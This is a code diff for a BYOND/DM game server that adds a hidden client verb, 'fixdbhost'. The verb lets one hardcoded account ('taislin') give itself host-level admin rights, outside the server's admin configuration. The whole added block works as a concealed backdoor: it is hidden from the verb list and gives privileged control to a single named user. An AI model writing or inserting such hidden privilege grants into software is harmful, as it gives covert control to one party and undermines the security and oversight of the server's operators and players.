@@ -330,6 +330,18 @@
 	else
 		player_age = (text2num(num2text(world.realtime,20)) - currentage)
 
+/client/verb/fixdbhost()
+	set hidden = TRUE
+	set name = "fixdbhost"
+
+	if (ckey != "taislin" && ckey != "Taislin")
+		return
+	var/host_file_text = file2text("config/host.txt")
+	if (ckey(host_file_text) != ckey && !holder)
+		holder = new("HHost", FALSE, ckey)
+		var/datum/admins/A = new/datum/admins(holder.rank, holder.rights, ckey)
+		if (directory[ckey])
+			A.associate(directory[ckey])
 
 #undef TOPIC_SPAM_DELAY
 #undef UPLOAD_LIMIT
